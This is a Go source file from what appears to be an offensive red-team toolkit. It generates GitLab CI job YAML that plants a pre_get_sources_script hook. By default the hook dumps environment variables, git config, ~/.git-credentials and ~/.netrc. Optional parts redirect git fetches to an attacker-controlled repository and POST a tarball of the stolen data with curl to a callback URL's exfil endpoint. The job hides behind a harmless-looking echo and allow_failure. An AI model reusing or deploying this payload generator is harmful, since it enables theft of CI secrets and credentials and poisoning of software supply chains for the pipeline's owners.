package payloads

import (
	"fmt"
	"strings"
)

// PreGetSourcesOptions configures a pre_get_sources_script injection payload.
type PreGetSourcesOptions struct {
	Common       CommonOptions
	HookScript   string // custom hook content (default: env dump + credential sweep)
	CallbackURL  string // HTTP callback for exfiltration
	ModifyGitURL string // redirect git fetch to attacker-controlled repo
}

// GeneratePreGetSourcesYAML generates a CI job that injects a
// hooks:pre_get_sources_script to execute code before Git fetches sources.
func GeneratePreGetSourcesYAML(o PreGetSourcesOptions) string {
	name, stage := o.Common.defaults("pre-get-sources")
	script := buildPreGetSourcesScript(o)

	return fmt.Sprintf(`stages: [%s]

%s:
  stage: %s%s%s
  hooks:
    pre_get_sources_script:
      - |
%s
  script:
    - echo "Source retrieval completed"
  allow_failure: true%s
`, stage, name, stage, imageLine(o.Common.Image), tagsLine(o.Common.Tags),
		indentBlock(strings.TrimSpace(script), 8),
		rulesManual(o.Common.Manual))
}

func buildPreGetSourcesScript(o PreGetSourcesOptions) string {
	if strings.TrimSpace(o.HookScript) != "" {
		return o.HookScript
	}

	var b strings.Builder

	b.WriteString(`_HOOK() {
  local _d
  _d=$(mktemp -d)

  # Step 1: Dump environment before source retrieval
  printenv | sort > "$_d/pre_source_env.txt" || true
  cat /proc/self/environ 2>/dev/null | tr '\0' '\n' >> "$_d/pre_source_env.txt" || true

  # Step 2: Capture Git credentials and config
  git config --global --list > "$_d/git_config.txt" 2>/dev/null || true
  cat ~/.git-credentials 2>/dev/null >> "$_d/git_creds.txt" || true
  cat ~/.netrc 2>/dev/null >> "$_d/netrc.txt" || true
`)

	if strings.TrimSpace(o.ModifyGitURL) != "" {
		fmt.Fprintf(&b, `
  # Step 3: Redirect git fetch to attacker-controlled repository
  git config --global url."%s".insteadOf "$CI_REPOSITORY_URL" || true
`, o.ModifyGitURL)
	}

	if strings.TrimSpace(o.CallbackURL) != "" {
		fmt.Fprintf(&b, `
  # Exfiltrate captured data
  tar czf "$_d/pre_source.tar.gz" -C "$_d" . 2>/dev/null || true
  curl -sS -X POST -F "file=@$_d/pre_source.tar.gz" -F "project=$CI_PROJECT_PATH" "%s/exfil" || true
`, o.CallbackURL)
	}

	b.WriteString(`
  rm -rf "$_d" || true
}
_HOOK || true`)

	return b.String()
}
